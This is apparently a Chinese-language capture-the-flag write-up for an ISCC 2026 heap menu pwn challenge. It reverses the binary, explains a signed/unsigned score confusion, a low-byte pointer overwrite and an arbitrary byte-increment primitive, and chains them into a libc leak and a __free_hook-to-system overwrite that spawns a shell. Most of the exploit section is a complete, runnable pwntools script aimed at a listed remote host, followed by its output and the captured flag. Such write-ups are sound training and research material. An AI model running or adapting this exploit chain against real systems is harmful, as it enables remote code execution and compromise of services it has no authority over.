# ISCC 2026 PWN — 菜单堆题利用（低字节覆写 + 奖励原语）

| 项目        | 内容                                                  |
| --------- | --------------------------------------------------- |
| **目标地址**  | `39.96.193.120:10015`                               |
| **二进制文件** | `attachment-35`，ELF x86-64，PIE，Full RELRO，NX，Canary |
| **Libc**  | `attachment-35.so`（glibc 2.31）                      |
| **Flag**  | ISCC{a4473d95-661e-4106-b06c-8151a4e1a7b0}          |

---

## 1. 逆向分析

程序实现了一个双角色菜单系统：教师（teacher）和学生（student）。主函数根据 `dword_5010` 的值在两个循环间切换（0 = 教师，1 = 学生）。

### 1.1 数据结构

```
student_info（0x18 字节，calloc 分配）：
  +0x0: int qnum          — 题目数量
  +0x4: int score         — 当前分数
  +0x8: char *review      — 评语内容指针
  +0x10: int review_size  — 评语缓冲区大小

student_wrap（0x20 字节，calloc 分配）：
  +0x0: student_info *info
  +0x8:（未使用 / 对齐填充）
  +0x10: void *mode_ptr   — 指向 0x20 字节 mode 块的指针
  +0x18: int prayed       — 祈祷标志（XOR 翻转）
  +0x1c: int rewarded     — 奖励标志（一次性设置）
```

两者均在堆上分配。全局数组 `qword_5080` 保存最多 7 个 `student_wrap*` 指针，通过学生 ID（0–6）索引。

### 1.2 关键函数（IDA 反编译）

**添加学生**（`sub_1424`）：
```c
v1 = calloc(1, 0x20);           // student_wrap
*v1 = calloc(1, 0x18);          // student_info
qword_5080[dword_503C++] = v1;  // 存入数组，计数加一
printf("enter the number of questions: ");
scanf("%d", &qnum);             // 存入 info->qnum
```

**打分**（`sub_1538`）：
```c
for (i = 0; i < dword_503C; i++) {
    read(fd, buf, 8);                           // /dev/urandom
    buf[0] &= ~0x80;
    v2 = buf[0] % (10 * info->qnum);            // 随机分数
    printf("score for the %dth student is %d\n", i, v2);
    if (wrap->prayed == 1) {
        puts("the student is lazy! b@d!");
        v2 -= 10;                               // 祈祷惩罚
    }
    info->score = v2;                           // 存储（可能为负数！）
}
```

分数以有符号 `int` 存储。如果学生祈祷过，分数减 10，可能变成负数。

**写评语**（`sub_1691`）：
```c
printf("which one? > ");
scanf("%d", &idx);
if (info->review) {
    // 重写已有评语
    read(0, info->review, info->review_size);
} else {
    // 分配新评语
    printf("please input the size of comment: ");
    scanf("%d", &size);
    info->review = malloc(size);
    info->review_size = size;
    read(0, info->review, size);
}
```

**叫家长 / 释放**（`sub_1875`）：
```c
if (info->review) free(info->review);
free(info);
free(wrap);
qword_5080[idx] = 0;
dword_503C--;
```

**设置模式**（`sub_1B05`）— 核心漏洞点：
```c
if (wrap->prayed != 1) {
    // 正常路径
    if (!wrap->mode_ptr)
        wrap->mode_ptr = calloc(1, 0x20);
    puts("enter your mode!");
    read(0, wrap->mode_ptr, 0x20);           // 写入 0x20 字节
} else {
    // 祈祷路径
    puts("enter your pray score: 0 to 100");
    scanf("%d", &v3);
    if (v3 <= 100)
        *(unsigned char *)&wrap->mode_ptr = v3;  // 低字节覆写！
}
```

**查看评语 / 奖励**（`sub_1C5B`）：
```c
if (!wrap->rewarded) {
    if ((unsigned)info->score > 0x59) {      // 无符号比较！
        printf("Good Job! Here is your reward! %p\n", wrap);
        printf("add 1 to wherever you want! addr: ");
        custom_read(0, buf, 16);
        (*(unsigned char *)atol(buf))++;     // 任意地址字节 +1
        wrap->rewarded = 1;
    }
}
if (info->review) {
    puts("here is the review:");
    write(1, info->review, info->review_size);
}
```

**自定义读取函数**（`sub_131A`）：
```c
read(fd, buf, size);
for (i = 0; buf[i] != '\n'; i++);
buf[i - 1] = '\0';   // 吃掉换行符前一个字符！
buf[size] = 0xC3;    // 哨兵字节
```

---

## 2. 漏洞分析

### 2.1 有符号→无符号分数混淆 → 奖励触发

`sub_1538` 中分数以有符号 `int` 存储，而 `sub_1C5B` 中 `(unsigned)info->score > 0x59` 以无符号方式解读。负数（如 -5 = `0xFFFFFFFB` 作为无符号数）恒**大于 89**，因此奖励可被触发。

**如何获得负数分数**：祈祷翻转 prayed 标志后，打分时减 10。若随机分数为 0–9，减 10 后变为 **-10 到 -1**。由于 -1 作为无符号数 > 89 恒成立，奖励即可领取。

利用脚本循环打分直到获得较小的随机分数（惩罚前 < 10），确保最终分数在符号解释下 < 10，但在无符号解释下 > 89。

### 2.2 `set_mode` 低字节写 → 指针重定向

学生祈祷后（prayed = 1），`set_mode` 进入祈祷分支，将用户控制的字节（0–100）写入 `mode_ptr` 的**最低字节**。由于 x86-64 上堆地址形如 `0x5555XXXXXXXX` 或 `0x7FFFXXXXXXXX`，修改低字节可将指针在同一页内偏移。

结合后续的 `set_mode` 调用（再次 pray 将 prayed 翻转回 0），形成以下利用链：

1. **Pray** → prayed 标志翻转为 1
2. **Set mode（祈祷路径）**→ 覆写 `mode_ptr` 低字节 → 指针指向可控偏移
3. **Pray** → prayed 标志翻转为 0
4. **Set mode（正常路径）**→ 向重定向后的 `mode_ptr` 写入 0x20 字节

这是一个受限的**写-写-何处**原语：0x20 字节，目标必须在原 mode 块附近。

### 2.3 奖励任意字节 +1

奖励机制中的 `sub_131A` 自定义读取函数实现任意地址字节加一操作：

```c
(*(unsigned char *)atol(buf))++;
```

这提供了精确的单字节修补能力，用于修正堆元数据。

此外，奖励函数会打印 `student_wrap` 的堆地址，提供了**堆泄漏**。

### 2.4 通过块重叠泄漏 Unsorted Bin

利用奖励字节修补修改块大小/元数据后，释放到 unsorted bin 中的块可以通过相邻块的评语内容读取。这泄漏了 `main_arena` 指针（fd/bk 指向 `main_arena + 96`），进而通过以下公式计算 **libc 基址**：

```
main_arena = *(uint64_t *)(泄漏地址) - 96
libc_base  = main_arena - (&__malloc_hook + 0x10)
```

---

## 3. 利用步骤

最终目标是改写 `__free_hook` 为 `system`，然后释放含有 `"/bin/sh"` 的块，获得 shell。

### 第一阶段：堆布局准备

创建 4 名学生并分配不同大小的评语：

| 学生 | 评语大小 | 用途 |
|------|---------|------|
| 0 | 0xA0 | 泄漏目标（与大块相邻） |
| 1 | 0x3F0 | 大块 → 释放后进入 unsorted bin |
| 2 | 0xA0 | 堆布局间隔 |
| 3 | 0x200 | 第一个奖励目标（堆锚点） |

### 第二阶段：首次奖励与字节修补

1. 使学生 3 可获奖励：祈祷 → 打分直到分数较低（有符号 < 10）
2. 领取奖励 → 获得**堆锚点**地址（学生 3 的 `student_wrap`）
3. 计算 `patch_a = anchor - 0x617` 和 `patch_b = patch_a + 0x110`
4. 使用奖励的字节递增修补 `patch_a`

### 第三阶段：第二次奖励

1. 再创建 3 名学生（4、5、6）并分配 0x300 的评语
2. 使学生 4 可获奖励
3. 使用奖励修补 `patch_b`

这两次修补修改伪造块的元数据字节，为后续块重叠做准备。

### 第四阶段：泄漏 Libc

1. 使学生 0 可获奖励
2. `call_parent(1)` → 释放学生 1 的 0x3F0 评语 → 进入 **unsorted bin**
3. 领取学生 0 的奖励 → 获得另一个堆地址
4. 使用字节递增修补 `spill + 0x40 + 2` 处的字节，使 unsorted bin 指针暴露在学生 0 的评语中
5. 读取评语内容 → 提取 `main_arena` 指针 → 计算 **libc 基址**

### 第五阶段：伪造对象与任意地址写

获得 libc 基址后：

1. 使用 `write_review`（重写模式）向学生 0 的现有评语区写入精心构造的 payload
2. payload 模拟合法对象元数据，使后续评语重写操作的目标变为 `__free_hook`
3. 将 `system` 地址写入 `__free_hook`
4. 将 `"/bin/sh\x00"` 写入学生 5 的评语

### 第六阶段：触发 Shell

`call_parent(5)` 释放学生 5 的所有块。由于 `__free_hook` = `system`，`free("/bin/sh")` 实际执行 `system("/bin/sh")`。

### 读取 Flag

获得 shell 后尝试读取 flag 文件：

```
cat /flag     → "No such file or directory"（路径不对）
cat /flag*    → ISCC{...}
```

Flag 文件在远程文件系统上存在于匹配 `/flag*` 的路径。

---

## 4. 完整利用脚本（`test.py`）

```python
#!/usr/bin/env python3
from pwn import *

BINARY = "./attachment-35"
LIBC_PATH = "./attachment-35.so"
HOST = "39.96.193.120"
PORT = 10015

context.binary = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def u64b(data):
    return u64(data.ljust(8, b"\x00"))


class Challenge:
    """封装远程连接与菜单操作。"""

    def __init__(self, io):
        self.io = io

    def sendl(self, delim, data):
        self.io.sendlineafter(delim, data)

    def send(self, delim, data):
        self.io.sendafter(delim, data)

    def menu_choose(self, idx):
        self.sendl(b"choice>> ", str(idx).encode())

    def to_teacher(self):
        self.menu_choose(5)
        self.sendl(b"role: <0.teacher/1.student>: ", b"0")

    def to_student(self):
        self.menu_choose(5)
        self.sendl(b"role: <0.teacher/1.student>: ", b"1")

    def add_student(self, qnum=9):
        self.menu_choose(1)
        self.sendl(b"enter the number of questions: ", str(qnum).encode())

    def grade_all(self):
        """给所有学生打分，返回 {id: score} 字典。"""
        self.menu_choose(2)
        prompt = b"choice>> "
        raw = self.io.recvuntil(prompt)
        self.io.unrecv(prompt)
        pairs = re.findall(rb"score for the (\d+)th student is (-?\d+)", raw)
        return {int(i): int(v) for i, v in pairs}

    def write_review(self, idx, data, size=None):
        """教师写评语。size=None 表示重写已有评语。"""
        self.menu_choose(3)
        self.sendl(b"which one? > ", str(idx).encode())
        if size is None:
            self.send(b"enter your comment:", data)
        else:
            self.sendl(b"please input the size of comment: ", str(size).encode())
            self.send(b"enter your comment:", data)

    def call_parent(self, idx):
        """释放学生 idx 的所有块。"""
        self.menu_choose(4)
        self.sendl(b"which student id to choose?", str(idx).encode())

    def change_id(self, idx):
        self.menu_choose(6)
        self.sendl(b"input your id: ", str(idx).encode())

    def pray(self):
        """翻转祈祷标志（XOR 1）。"""
        self.menu_choose(3)

    def set_mode(self, payload=None, pray_score=None):
        self.menu_choose(4)
        if pray_score is not None:
            self.sendl(b"enter your pray score: 0 to 100", str(pray_score).encode())
        else:
            self.send(b"enter your mode!", payload)

    def make_rewardable(self, idx):
        """使学生 idx 可获奖励（获得负数分数）。"""
        self.to_student()
        self.change_id(idx)
        self.pray()
        self.to_teacher()
        scores = self.grade_all()
        while scores[idx] >= 10:
            scores = self.grade_all()
        return scores[idx]

    def claim_reward(self, idx):
        """领取奖励。返回泄漏的堆地址。"""
        self.to_student()
        self.change_id(idx)
        self.menu_choose(2)
        self.io.recvuntil(b"Good Job! Here is your reward! ")
        addr = int(self.io.recvline().strip(), 16)
        self.io.recvuntil(b"addr: ")
        return addr

    def reward_increment(self, addr):
        """字节递增。末尾加 '1' 因为 sub_131A 会吃掉一个字符。"""
        self.io.sendline((str(addr) + "1").encode())

    def read_review_leak(self):
        """从评语内容中读取 7 字节（unsorted bin 泄漏）。"""
        self.io.recvuntil(b"here is the review:\n")
        return self.io.recv(7)


def exploit(io):
    ch = Challenge(io)

    # ---- 初始选择教师身份 ----
    ch.sendl(b"role: <0.teacher/1.student>: ", b"0")

    # ---- 第一阶段：堆布局 ----
    ch.add_student(9)
    ch.write_review(0, b"x", size=0xA0)
    ch.add_student(9)
    ch.write_review(1, b"x", size=0x3F0)
    ch.add_student(9)
    ch.write_review(2, b"x", size=0xA0)
    ch.add_student(9)
    ch.write_review(3, b"x", size=0x200)

    # ---- 第二阶段：首次奖励 + 修补 ----
    ch.make_rewardable(3)
    anchor = ch.claim_reward(3)
    log.info(f"堆锚点 = {anchor:#x}")

    patch_a = anchor - 0x617
    patch_b = patch_a + 0x110
    ch.reward_increment(patch_a)

    # ---- 第三阶段：更多学生 + 第二次修补 ----
    ch.to_teacher()
    ch.add_student(9)
    ch.write_review(4, b"x", size=0x300)
    ch.add_student(9)
    ch.write_review(5, b"x", size=0x300)
    ch.add_student(9)
    ch.write_review(6, b"x", size=0x300)

    ch.make_rewardable(4)
    ch.claim_reward(4)
    ch.reward_increment(patch_b)

    # ---- 第四阶段：Unsorted bin → Libc 泄漏 ----
    ch.make_rewardable(0)
    ch.to_teacher()
    ch.call_parent(1)

    ch.to_student()
    ch.change_id(0)
    ch.menu_choose(2)

    ch.io.recvuntil(b"Good Job! Here is your reward! ")
    spill = int(ch.io.recvline().strip(), 16)
    ch.io.recvuntil(b"addr: ")
    ch.reward_increment(spill + 0x40 + 2)

    main_arena = u64b(ch.read_review_leak()) - 96
    libc_base = main_arena - (libc.sym["__malloc_hook"] + 0x10)
    libc.address = libc_base
    log.success(f"main_arena = {main_arena:#x}")
    log.success(f"libc 基址  = {libc_base:#x}")

    # ---- 第五阶段：伪造对象 → 写 __free_hook ----
    free_hook = libc.sym["__free_hook"]
    system_addr = libc.sym["system"]
    log.info(f"__free_hook = {free_hook:#x}")
    log.info(f"system      = {system_addr:#x}")

    ch.to_teacher()
    fake_payload = (
        p64(main_arena + 96)
        + p64(main_arena + 96)
        + b"X" * 0x4E0
        + p64(0x500)
        + p64(0x30)
        + p64(anchor + 0x30)
        + p64(0) * 2
        + p64(0x0000000100000001)
        + p64(0)
        + p64(0x21)
        + p64(0x0000004800000009)
        + p64(free_hook)
        + p64(0x200)
        + p64(0x201)
        + p64(0xA777777)
    )
    ch.write_review(0, fake_payload, size=None)

    # 写 system → __free_hook
    ch.write_review(3, p64(system_addr), size=None)
    # 写 "/bin/sh" 到学生 5 的评语
    ch.write_review(5, b"/bin/sh\x00", size=None)

    # ---- 第六阶段：触发 system("/bin/sh") ----
    ch.call_parent(5)

    sleep(1)
    io.sendline(b"cat /flag*")
    print(io.recvrepeat(1).decode("latin-1", errors="ignore"))
    io.interactive()


if __name__ == "__main__":
    io = remote(HOST, PORT)
    exploit(io)
```

---

## 5. 运行结果

```bash
$ python3 test.py
[+] Opening connection to 39.96.193.120:10015: Done
[*] 堆锚点 = 0x5573d25908f0
[+] main_arena = 0x7fa7a015bb80
[+] libc 基址  = 0x7fa79ff6f000
[*] __free_hook = 0x7fa7a015de48
[*] system      = 0x7fa79ffc1290
bad luck for student 5! Say goodbye to him/her!
cat: /flag: No such file or directory
ISCC{a4473d95-661e-4106-b06c-8151a4e1a7b0}
```

---

## 6. 关键要点

1. **无符号分数比较**（`(unsigned)score > 0x59`）是奖励触发的入口——它将祈祷惩罚产生的负数分数转化为奖励条件（正常情况下最大分数仅 89，达不到 > 89 的条件）。

2. **`set_mode` 低字节写**是唯一的堆破坏原语，但与奖励的任意字节递增结合后，构成了完整的利用链。

3. **堆地址稳定性至关重要**——偏移计算（`anchor - 0x617`）依赖于相同二进制和 libc 版本的确定性堆布局。

4. **`sub_131A` 的"吃掉一个字符"特性**意味着发送给奖励提示的每个地址末尾都必须添加一个哑字符（追加的 `"1"`），以防止最后一位数字被 null 终止。

---

## 7. Flag

```
ISCC{a4473d95-661e-4106-b06c-8151a4e1a7b0}
```
